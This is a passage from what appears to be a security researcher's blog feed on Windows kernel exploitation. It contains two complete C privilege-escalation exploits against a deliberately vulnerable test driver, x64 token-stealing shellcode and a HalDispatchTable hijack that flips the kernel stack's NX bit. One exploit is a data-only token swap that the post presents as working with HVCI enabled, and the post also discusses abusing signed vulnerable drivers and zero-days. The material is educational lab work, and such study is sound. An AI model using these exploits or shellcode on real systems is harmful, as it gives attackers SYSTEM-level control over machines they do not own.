        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,                       // No source, use system message table
        errorCode,                  // Error code
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
        (LPSTR)&amp;errorMsgBuffer,     // Output buffer
        0,                          // Minimum size
        NULL                        // No arguments
    );

    if (size == 0) {
        printf("%s: Unknown error code %lu.\n", customMessage, errorCode);
    }
    else {
        // Remove trailing newlines from the system message
        char* msg = (char*)errorMsgBuffer;
        for (char* p = msg; *p; p++) {
            if (*p == '\r' || *p == '\n') {
                *p = '\0';
                break;
            }
        }
        printf("%s: (Error %lu) %s\n", customMessage, errorCode, msg);
    }

    // Free the buffer allocated by FormatMessage
    if (errorMsgBuffer) {
        LocalFree(errorMsgBuffer);
    }
}

ULONGLONG readQWORD(ULONGLONG addr, HANDLE driver, PULONGLONG readBuf)
{
    ULONG IoControlCode = 0x223c00;
    PULONGLONG inBuf = readBuf;
    ULONG inBufLength = sizeof(ULONGLONG);
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)readBuf + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    inBuf[0] = addr;

    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to read QWORD");
        exit(1);
    }

    ULONGLONG result = outBuf[0];
    return result;
}

ULONGLONG leakEProcess(ULONG pid, HANDLE driver, PULONGLONG inBuff)
{
    ULONG IoControlCode = 0x2237fc;
    PULONGLONG inBuf = inBuff;
    ULONG inBufLength = sizeof(ULONGLONG);
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)inBuff + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    inBuf[0] = pid;

    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to retrieve EPROCCESS");
        exit(1);
    }

    ULONGLONG result = outBuf[0];
    return result;
}

ULONGLONG walkEProcess(ULONGLONG eProcess, HANDLE driver, PULONGLONG readBuf) {
    DWORD currentTid = GetCurrentThreadId();

    ULONGLONG listHead = eProcess + EPROCESS_ThreadListHead_Offset;
    ULONGLONG flink = readQWORD(listHead, driver, readBuf);

    while (flink != listHead) {
        ULONGLONG ethread = flink - ETHREAD_ThreadListEntry_Offset;

        ULONGLONG uniqueTid = readQWORD(ethread + ETHREAD_Cid_Offset + CLIENTID_UniqueThread_Offset, driver, readBuf);

        if ((DWORD)uniqueTid == currentTid) {
            ULONGLONG kthread = ethread;  // Tcb is at offset 0x0
            printf("[+] Found current thread:\n");
            printf("[+] ETHREAD: 0x%llx\n", ethread);
            printf("[+] KTHREAD: 0x%llx\n", kthread);
            return kthread;
        }

        flink = readQWORD(flink, driver, readBuf);  // Move to next thread
    }

    printLastErrorMessage("[!] Current thread not found in EPROCESS thread list");
    exit(1);
}

ULONGLONG leakNtBase(ULONGLONG kthread, HANDLE driver, PULONGLONG readBuf)
{

    ULONGLONG ntAddr = readQWORD(kthread + 0x2a8, driver, readBuf);
    ULONGLONG baseAddr;
    ULONGLONG signature = 0x00905a4d;
    ULONGLONG searchAddr = (ntAddr - 0x400000) &amp; 0xFFFFFFFFFFFFF000;

    while (TRUE)
    {
        ULONGLONG readData = readQWORD(searchAddr, driver, readBuf);
        ULONGLONG tmp = readData &amp; 0xFFFFFFFF;

        if (tmp == signature)
        {
            baseAddr = searchAddr;
            break;
        }
        searchAddr = searchAddr - 0x1000;
    }
    return baseAddr;
}

ULONGLONG leakPteBase(ULONGLONG ntBase, HANDLE driver, PULONGLONG readBuf)
{

    ULONGLONG pteBaseAddr;
    unsigned char signature[] = { 0x00, 0x00, 0x00, 0x48, 0x23, 0xc8, 0x48, 0xb8 };
    ULONGLONG searchAddr = (ntBase + 0x40000b);

    while (TRUE)
    {
        ULONGLONG readData = readQWORD(searchAddr, driver, readBuf);
        ULONGLONG tmp = readData;
        int comp;
        comp = memcmp(signature, &amp;tmp, sizeof(ULONGLONG));
        if (comp == 0)
        {
            pteBaseAddr = readQWORD(searchAddr + 0x08, driver, readBuf);
            break;
        }
        searchAddr = searchAddr + 0x10;
    }
    return pteBaseAddr;
}

ULONGLONG leakHalDispatchTable(ULONGLONG ntBase, HANDLE driver, PULONGLONG readBuf)
{

    ULONGLONG halDispatchTableAddr;
    unsigned char signature[0x18] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    ULONGLONG searchAddr = (ntBase + 0xe00000);

    while (TRUE)
    {
        ULONGLONG readData = readQWORD(searchAddr, driver, readBuf);
        unsigned char tmp[0x18];
        memcpy(tmp, &amp;readData, sizeof(ULONGLONG));
        readData = readQWORD(searchAddr + 0x08, driver, readBuf);
        memcpy(tmp + 0x08, &amp;readData, sizeof(ULONGLONG));
        readData = readQWORD(searchAddr + 0x10, driver, readBuf);
        memcpy(tmp + 0x10, &amp;readData, sizeof(ULONGLONG));
        int comp;
        comp = memcmp(signature, tmp, 0x18);
        if (comp == 0)
        {
            halDispatchTableAddr = searchAddr + 0x10;//readQWORD(searchAddr + 0x18, driver, readBuf);
            break;
        }
        searchAddr = searchAddr + 0x10;
    }
    return halDispatchTableAddr;
}

ULONGLONG getPteAddress(ULONGLONG addr, ULONGLONG pteBase)
{
    ULONGLONG result = addr &gt;&gt; 9;
    result = result | pteBase;
    result = result &amp; (pteBase + 0x0000007ffffffff8);
    return result;
}

VOID writeQWORD(ULONGLONG addr, HANDLE driver, PULONGLONG readBuf, ULONGLONG what)
{
    ULONG IoControlCode = 0x223c04;
    PULONGLONG inBuf = readBuf;
    ULONG inBufLength = 0x10;
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)readBuf + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    ((PULONGLONG)inBuf)[0] = addr;
    ((PULONGLONG)((ULONGLONG)inBuf + 0x08))[0] = what;


    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to write QWORD");
        exit(1);
    }

    ULONGLONG result = outBuf[0];
    return;

}

int main()
{

    HANDLE apexHandle = CreateFile(L"\\\\.\\ApexDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);
    if (apexHandle == INVALID_HANDLE_VALUE)
    {
        printLastErrorMessage("[!] Failed to open file");
        exit(1);
    }
    printf("[+] Successfully obtained the driver handle.\n");

    PULONGLONG readBuf = (PULONGLONG)VirtualAlloc((PULONGLONG)0x000000001a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (readBuf == NULL)
    {
        printLastErrorMessage("[!] Failed to allocate buffer memory");
        exit(1);
    }
    memset((PULONGLONG)0x000000001a000000, 0x00, 0x1000);
    memset((PULONGLONG)0x000000001a001000, 0x00, 0x1000);
    printf("[+] Allocated buffer memory: 0x%llx\n", readBuf);

    ULONG pid = GetCurrentProcessId();
    printf("[+] Current Process Id: %lu\n", pid);
    ULONGLONG eProcess = leakEProcess(pid, apexHandle, readBuf);
    printf("[+] Current EPROCESS located at: 0x%llx\n", eProcess);

    ULONGLONG kThread = walkEProcess(eProcess, apexHandle, readBuf);


    printf("[+] KTHREAD located at: 0x%llx\n", kThread);

    ULONGLONG ntBase = leakNtBase(kThread, apexHandle, readBuf);
    printf("[+] NT Base Address: 0x%llx\n", ntBase);

    ULONGLONG pteBase = leakPteBase(ntBase, apexHandle, readBuf);
    printf("[+] PTE Base Address: 0x%llx\n", pteBase);

    ULONGLONG kStack = readQWORD(kThread + 0x38, apexHandle, readBuf);
    printf("[+] Kernel Stack Base: 0x%llx\n", kStack);

    kStack = kStack - 0x100;

    ULONGLONG kStackPteVa = getPteAddress(kStack, pteBase);
    printf("[+] PTE Address of Kernel Stack: 0x%llx\n", kStackPteVa);
    ULONGLONG kStackPte = readQWORD(kStackPteVa, apexHandle, readBuf);
    printf("[+] PTE Entry of Kernel Stack: 0x%llx\n", kStackPte);
    getchar();

    printf("[+] Writing shellcode to Kernel Stack.....\n");
    ULONGLONG* tokensteal = (ULONGLONG*)TokenStealing;
    ULONGLONG writeWhat = (ULONGLONG)tokensteal[0];
    writeQWORD(kStack, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[1];
    writeQWORD(kStack + 0x08, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[2];
    writeQWORD(kStack + 0x10, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[3];
    writeQWORD(kStack + 0x18, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[4];
    writeQWORD(kStack + 0x20, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[5];
    writeQWORD(kStack + 0x28, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[6];
    writeQWORD(kStack + 0x30, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[7];
    writeQWORD(kStack + 0x38, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[8];
    writeQWORD(kStack + 0x40, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[9];
    writeQWORD(kStack + 0x48, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[10];
    writeQWORD(kStack + 0x50, apexHandle, readBuf, writeWhat);
    writeWhat = (ULONGLONG)tokensteal[11];
    writeQWORD(kStack + 0x58, apexHandle, readBuf, writeWhat);

    printf("[+] Allocating memory for HalDispatchTable restore.\n");
    PULONGLONG restoreBuf = (PULONGLONG)VirtualAlloc((PULONGLONG)0x000000002b000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (readBuf == NULL)
    {
        printLastErrorMessage("[!] Failed to allocate buffer memory");
        exit(1);
    }
    memset((PULONGLONG)0x000000002b000000, 0x00, 0x1000);
    getchar();

    printf("[+] Flipping NX bit on Kstack...\n");
    writeWhat = kStackPte ^ (1ULL &lt;&lt; 63);
    writeQWORD(kStackPteVa, apexHandle, readBuf, writeWhat);
    ULONGLONG newkStackPte = readQWORD(kStackPteVa, apexHandle, readBuf);
    printf("[+] Modified PTE Entry of Kernel Stack: 0x%llx\n", newkStackPte);
    getchar();

    ULONGLONG halDispatchTable = leakHalDispatchTable(ntBase, apexHandle, readBuf);
    printf("[+] found HalDispatchTable at: 0x%llx\n", halDispatchTable);
    ULONGLONG haliQuerySystemInformation = readQWORD(halDispatchTable + 0x08, apexHandle, readBuf);
    printf("[+] HaliQuerySystemInformaton Address: 0x%llx\n", haliQuerySystemInformation);
    getchar();

    restoreBuf[0] = haliQuerySystemInformation;
    printf("[+] Hijacking HaliQuerySystemInformation...\n");
    writeQWORD(halDispatchTable + 0x08, apexHandle, readBuf, kStack);

    _NtQueryIntervalProfile pNtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
    if (!pNtQueryIntervalProfile)
    {
        printLastErrorMessage("[!] Error while resolving NtQueryIntervalProfile");
        exit(1);
    }
    ULONG trash;
    pNtQueryIntervalProfile(2, &amp;trash);
    Sleep(2000);

    writeQWORD(halDispatchTable + 0x08, apexHandle, readBuf, haliQuerySystemInformation);
    const char* notcmd = "start cmd.exe";

    system(notcmd);
    
        if (!VirtualFree(readBuf, 0, MEM_RELEASE))
    {
        printLastErrorMessage("[!] Release of readBuf failed");
        return 1;
    }

    if (!VirtualFree(restoreBuf, 0, MEM_RELEASE))
    {
        printLastErrorMessage("[!] Release of restoreBuf failed");
        return 1;
    }

    if (!CloseHandle(apexHandle))
    {
        printLastErrorMessage("[!] Release of driver handle failed");
        return 1;
    }

    return 0;
}
</code></pre>

<p>```x64 Assembly
_TEXT	SEGMENT</p>

<p>TokenStealing PROC
	get_eproc:
	nop
	nop
	nop
	nop
	nop
	push	rax										;save registers
	push	rcx										;
	push	r9										;
	push	r8										;
	xor     rax, rax								;Get the EPROCESS of current Process
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+1d8h]				;walk the linked process list to find SYSTEM process
	sub     rax, 1d8h								;
	mov     rcx, qword ptr [rax+1d0h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+248h]				;copy SYSTEM process token to current process
	mov     qword ptr [r8+248h], r9					;
	pop		r8										;restore registers
	pop		r9										;
	pop		rcx										;
	pop		rax										;we are about to overwrite this one but stack allignment is a thing
	mov		rax, qword ptr [2b000000h]				;HaliQuerySystemInformation
	jmp		rax
	ret</p>

<p>TokenStealing ENDP</p>

<p>_TEXT	ENDS</p>

<p>End</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
I previously mentioned that this exploit will not work if VBS and HVCI are enabled. HVCI prevents dynamic code in the kernel and would kill our exploit. It is still possible to conduct a Data Only attack. The Data Only Attack uses the EPROCESS leaks, read primitive, and write primitive to read the SYSTEM process token and copy it to our process's token without executing dynamic code in kernel-mode. We first need to enable VBS/HVCI to demonstrate this. You will need to ensure that the host's CPU virtualization features are exposed to the VM. In Hyper-V setups you would run the following command in PowerShell as an administrator on the host OS (remmeber to change the VM name to match your VM):

```PowerShell
Set-VMProcessor -VMName "Win11_25H2" -ExposeVirtualizationExtensions $true
</code></pre></div></div>

<p>Then start the VM and login as an administrator. Hit the Windows start menu and search for Windows Features. Select Turn Windows Features on or off  and then enabled Hyper-V.</p>

<p><img src="/assets/images/post3-windows-features.png" alt="post3-windows-features.png" /></p>

<p>You will then need to reboot the VM. Login as an administrator again after the VM boots and hit the Windows start menu and search for Windows Security. Select Windows security and then click on Device Security. Then select core isolation and turn on memory integrity. VBS/HVCI will be enabled following another reboot of the VM. Now all security features except SecureBoot are enabled. We still need Secure Boot off since we are using a test driver that is not signed by Microsoft. This still highlights how a signed vulnerable driver can still allow you to take full control of a system.</p>

<p><img src="/assets/images/post3-device-security.png" alt="post3-device-security.png" /></p>

<p>I have also created an non-admin user and a lower integrity command shell to use for this portion of the demo. You can create the local user from an admin command prompt with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user lopex /add

net user lopex PA$$w0rd123
</code></pre></div></div>

<p>I picked lopex as user name because it is low privilege and low integrity unlike the apex account. You can call it anything you want. Create a low integrity command shell on your low privilege account by opening a command prompt and running the following commands (remember to change the username to whatever you used):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy C:\Windows\System32\cmd.exe C:\Users\lopex\Desktop\cmd-low.exe

icacls C:\Users\lopex\Desktop\cmd-low.exe /setintegritylevel low
</code></pre></div></div>

<p>We will receive a bugcheck for page fault in non-paged memory if we attempt running our current POC. This is caused by KCFG generating a page fault when it attempts to validate the indirect call on our hijacked nt!HalDispatchTable. We can see that we successfully marked the Kernel Stack as executable and our POC crashed when it attempts code execution.</p>

<p><img src="/assets/images/post3-poc10-2.png" alt="post3-poc10-2.png" /></p>

<p><img src="/assets/images/post3-windbg-poc10-1.png" alt="post3-windbg-poc10-1.png" /></p>

<p><img src="/assets/images/post3-windbg-poc10-2.png" alt="post3-windbg-poc10-2.png" /></p>

<p><img src="/assets/images/post3-windbg-poc10-3.png" alt="post3-windbg-poc10-3.png" /></p>

<p>Our Data Only attack code only needs to locate our EPROCESS structure, locate the SYSTEM EPROCESS structure, read the token from the SYSTEM EPROCESS stucture, and write it to the token of our EPROCESS structure. The following code accomplishes this and then spawns cmd.exe:</p>

<pre><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;


void printLastErrorMessage(const char* customMessage) {
    DWORD errorCode = GetLastError(); // Retrieve the last error code
    if (errorCode == 0) {
        printf("%s: No error.\n", customMessage);
        return;
    }

    LPVOID errorMsgBuffer = NULL;

    // Format the error message from the system
    DWORD size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,                       // No source, use system message table
        errorCode,                  // Error code
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
        (LPSTR)&amp;errorMsgBuffer,     // Output buffer
        0,                          // Minimum size
        NULL                        // No arguments
    );

    if (size == 0) {
        printf("%s: Unknown error code %lu.\n", customMessage, errorCode);
    }
    else {
        // Remove trailing newlines from the system message
        char* msg = (char*)errorMsgBuffer;
        for (char* p = msg; *p; p++) {
            if (*p == '\r' || *p == '\n') {
                *p = '\0';
                break;
            }
        }
        printf("%s: (Error %lu) %s\n", customMessage, errorCode, msg);
    }

    // Free the buffer allocated by FormatMessage
    if (errorMsgBuffer) {
        LocalFree(errorMsgBuffer);
    }
}

ULONGLONG readQWORD(ULONGLONG addr, HANDLE driver, PULONGLONG readBuf)
{
    ULONG IoControlCode = 0x223c00;
    PULONGLONG inBuf = readBuf;
    ULONG inBufLength = sizeof(ULONGLONG);
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)readBuf + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    inBuf[0] = addr;

    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to read QWORD");
        exit(1);
    }

    ULONGLONG result = outBuf[0];
    return result;
}

ULONGLONG leakEProcess(ULONG pid, HANDLE driver, PULONGLONG inBuff)
{
    ULONG IoControlCode = 0x2237fc;
    PULONGLONG inBuf = inBuff;
    ULONG inBufLength = sizeof(ULONGLONG);
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)inBuff + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    inBuf[0] = pid;

    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to retrieve EPROCCESS");
        exit(1);
    }

    ULONGLONG result = outBuf[0];
    return result;
}

VOID writeQWORD(ULONGLONG addr, HANDLE driver, PULONGLONG readBuf, ULONGLONG what)
{
    ULONG IoControlCode = 0x223c04;
    PULONGLONG inBuf = readBuf;
    ULONG inBufLength = 0x10;
    PULONGLONG outBuf = ((PULONGLONG)((ULONGLONG)readBuf + 0x1000));
    ULONG outBufLength = sizeof(ULONGLONG);
    ULONG lpBytesReturned;

    ((PULONGLONG)inBuf)[0] = addr;
    ((PULONGLONG)((ULONGLONG)inBuf + 0x08))[0] = what;


    BOOL triggerIOCTL;
    triggerIOCTL = DeviceIoControl(driver, IoControlCode, inBuf, inBufLength, outBuf, outBufLength, &amp;lpBytesReturned, NULL);
    if (!triggerIOCTL)
    {
        printLastErrorMessage("[!] Failed to write QWORD");
        exit(1);
    }

    ULONGLONG result = outBuf[0];
    return;

}

int main()
{

    HANDLE apexHandle = CreateFile(L"\\\\.\\ApexDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);
    if (apexHandle == INVALID_HANDLE_VALUE)
    {
        printLastErrorMessage("[!] Failed to open file");
        exit(1);
    }
    printf("[+] Successfully obtained the driver handle.\n");

    PULONGLONG readBuf = (PULONGLONG)VirtualAlloc((PULONGLONG)0x000000001a000000, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (readBuf == NULL)
    {
        printLastErrorMessage("[!] Failed to allocate buffer memory");
        exit(1);
    }
    memset((PULONGLONG)0x000000001a000000, 0x00, 0x1000);
    memset((PULONGLONG)0x000000001a001000, 0x00, 0x1000);
    printf("[+] Allocated buffer memory: 0x%llx\n", readBuf);

    ULONG pid = GetCurrentProcessId();
    printf("[+] Current Process Id: %lu\n", pid);
    ULONGLONG eProcess = leakEProcess(pid, apexHandle, readBuf);
    printf("[+] Current EPROCESS located at: 0x%llx\n", eProcess);

    ULONG sPid = 0x4;
    ULONGLONG seProcess = leakEProcess(sPid, apexHandle, readBuf);
    printf("[+] SYSTEM EPROCESS located at: 0x%llx\n", seProcess);
    
    ULONGLONG sToken = readQWORD(seProcess + 0x248, apexHandle, readBuf);
    printf("[+] SYSTEM token: 0x%llx\n", sToken);

    writeQWORD(eProcess + 0x248, apexHandle, readBuf, sToken);
    printf("[+] SYSTEM token written to current EPROCESS\n");

    const char* notcmd = "start cmd.exe";

    system(notcmd);

    if (!VirtualFree(readBuf, 0, MEM_RELEASE))
    {
        printLastErrorMessage("[!] Release of readBuf failed");
        return 1;
    }

    if (!CloseHandle(apexHandle))
    {
        printLastErrorMessage("[!] Release of driver handle failed");
        return 1;
    }

    return 0;
}
</code></pre>

<p>Compile and execute the new POC on the test VM as the low privileged user from a low integrity command shell and you will receive a SYSTEM command shell.</p>

<p><img src="/assets/images/post3-poc11-1.png" alt="post3-poc11-1.png" /></p>

<p>Microsoft pushes the blocked driver list to combat exploitation of known vulnerable drivers by preventing their install. This helps counter the Bring Your Own Vulnerable Driver (BYOVD) attacks. It does not stop the exploitation of signed drivers that are not on the block list though. You have a small window to BYOVD known vulnerable drivers before they are blocked. You can also find zero days in signed drivers and use those until they are burned.</p>

<p>This concludes this demo on introductory level kernel driver writing and exploitation.</p>]]></content><author><name></name></author><category term="posts" /><summary type="html"><![CDATA[This blog post covers the basic fundamentals of writing a Windows kernel driver. We will then cover Reverse Engineering (RE) our simple driver to find vulnerabilities and then write a custom exploit for our driver. This post is meant to be a “beginner” or introductory level for Windows kernel-mode exploitation. We will first cover using the same HalDispatchTable hijack from my previous blog post to gain kernel-mode code execution Finding a Needle in a KSTACK. I recommend reading that post first if you are new to kernel exploitation as I do not explain some of the structures as in depth as I do in that one. This demo requires ensuring that HVCI is disabled by removing the Hyper-V feature if it was installed. We will cover kernel-mode code execution with HVCI disabled first and then cover a Data Only attack to show that we can still achieve our objects when we have a read/write primitive if HVCI is enabled. You will need to enable test signing for the driver on the target VM. Secure Boot most be disabled to enabled test signing. You can find the Visual Studio solution and all source code on my GitHub ASSVD_demo.]]></summary></entry><entry><title type="html">Finding A Needle In A KSTACK</title><link href="https://apexpredator-infosec.github.io/posts/2025/12/12/Finding-A-Needle-In-A-KSTACK.html" rel="alternate" type="text/html" title="Finding A Needle In A KSTACK" /><published>2025-12-12T13:16:45-05:00</published><updated>2025-12-12T13:16:45-05:00</updated><id>https://apexpredator-infosec.github.io/posts/2025/12/12/Finding-A-Needle-In-A-KSTACK</id><content type="html" xml:base="https://apexpredator-infosec.github.io/posts/2025/12/12/Finding-A-Needle-In-A-KSTACK.html"><![CDATA[<p>I ran in to an issue with triggering a bugcheck AKA the Blue Screen Of Death or BSOD on Windows 10 20H1 while solving an Extra Mile exercise in the EXP-401 course. The challenge was to change the exploit from the course material targeting CVE-2021-1732 from a Data Only attack to Code Execution.</p>

<p>In a Data Only Attack we use the read/write primitives of the exploit to find the SYSTEM process and copy it’s token to our current process thus elevating our process to SYSTEM. This prevents us from having to execute shellcode or dynamic code in the kernel, which would be stopped by Hypervisor-protected Code Integrity (HVCI). HVCI works sort of like Arbitrary Code Guard (ACG) in user-mode, but protects the kernel-mode memory. The gist at a high level is code is immutable, dynamic code is bad and should not run and therefor HVCI makes it impossible to run dynamic code. You can read more about HVCI on the Microsoft site. <a href="https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity?tabs=security">HVCI</a> HVCI has to be turned off by removing the Hyper-V role and disabling Virtualization Based Security (VBS) in the VM to play around with the kernel-mode code execution challenge. A Windows 10 20H2 VM without HVCI/VBS is used in the demo for this blog.</p>

<p>The task seemed easy enough:</p>
<ol>
  <li>Allocate user-mode memory</li>
  <li>Copy token stealing shellcode to the user-mode memory address that I control</li>
  <li>Enumerate the Page Table Entry (PTE) for that user-mode memory address I control</li>
  <li>Use the read and write primitives to change the User/Supervisor (U/S) bit to S AKA 0</li>
  <li>Hijack execution through the HalDispatchTable by replacing HalDispatchTable+0x08 (HaliQuerySystemInformation) with the address of my shellcode</li>
  <li>Trigger HalDispatchTable+0x08 from user-mode</li>
  <li>Start a command prompt cmd.exe</li>
</ol>

<p>In reality it was not that simple. I will walk through a similar scenario of solving the HalDispatchTable hijack in this blog with a little Reverse Engineering (RE) and a lot of kernel debugging. I will also switch from the TagWND exploit CVE-2021-1732 to attacking CVE-2021-31955, CVE-2015-4077, and CVE-2015-5736 on Windows 10 20H2 to avoid spoiling the Extra Mile from EXP-401. This attacks the forti shield driver and a native Windows information leak for a full chain. I built this exploit combining two public POCs and making modifications for OS version and to target code execution through the HalDispatchTable. There is also an Extra Mile in EXP-401 2025 course version to solve that same forti shield exploit, but it is on a different version of the OS so my hard coded offsets won’t work and you will BSOD if you just try to run it to solve that one. If you wish to follow along in your own lab you will need a Windows 10 20H2 VM with Fortinet FortiClient 5.2.3 installed. You will also need a VM for kernel debugging with WinDbg.</p>

<p>This blog is intended to be a deeper dive on the HalDispatchTable and issues caused by HVCI and will be lighter on the explanation of the CVEs.</p>

<p>CVE-2021-31955 is a native Windows kernel vulnerability that allows for leaking the EPROCESS address for all processes running on the system. the high level overview is that poor access controls allowed using the SUPERFETCH feature in the NtQuerySystemInformation API in low integrity to query the EPROCESS address of each running process. Microsoft has patched this particular flaw and has implemented additional hardening in the NtQuerySystemInformation API to prevent leaking kernel-mode address in Medium and High integrity levels as well. In Windows 11 24H2 Microsoft implemented the ExIsRestrictedCaller flag that now checks to see if the calling process has the SeDebugPrivelege before returning kernel-mode addresses. A process that does not have the SeDebugPrivilege will received zeroed out or masked kernel-mode pointers and addresses <a href="https://windows-internals.com/kaslr-leaks-restriction/">KASLR-Leaks-Restriction</a>. The Kernel Page Table Isolation also prevents dereferencing kernel-mode memory from users-mode requiring you to use a kernel-mode read/write primitive for any leaked addresses to be useful.</p>

<p>freeide’s POC code <a href="https://github.com/freeide/CVE-2021-31955-POC/tree/main/CVE-2021-31955">CVE-2021-31955</a>was used and slightly modified to work in this exploit. The main changes were adding a target process name parameter to the GetEprocessAddress() function, modifying the for loops to find the target process and only print it’s EPROCESS instead of all running processes, and returning the target process EPROCESS address as a ULONGLONG instead of returning void. A walkEprocess() function was also added to return the KTHREAD from passing in the EPROCESS. You will notice variations in naming conventions for functions and variables in this POC. This is because I’m lazy and felt it too tedious to modify the combined POCs into a single consistent naming convention. I’m ok with you judging me for that.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="n">GetEprocessAddress</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">target</span><span class="p">)</span>
<span class="p">....</span>

	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">targetName</span> <span class="o">=</span> <span class="n">target</span><span class="p">;</span>
	<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">procName</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">ULONG</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoCount</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">procName</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">data</span><span class="p">[</span><span class="mh">0x14</span><span class="p">];</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">targetName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="c1">//printf("%15s\t%5d\t%p\n", procName, sv3plus_request-&gt;InfoArrayV3Plus[i].ProcessId, sv3plus_request-&gt;InfoArrayV3Plus[i].EProcess);</span>
			<span class="k">return</span> <span class="n">sv3plus_request</span><span class="o">-&gt;</span><span class="n">InfoArrayV3Plus</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">EProcess</span><span class="p">;</span>
		<span class="p">}</span>

<span class="p">...</span>
<span class="n">ULONGLONG</span> <span class="n">walkEprocess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">eProcess</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">currentTid</span> <span class="o">=</span> <span class="n">GetCurrentThreadId</span><span class="p">();</span>

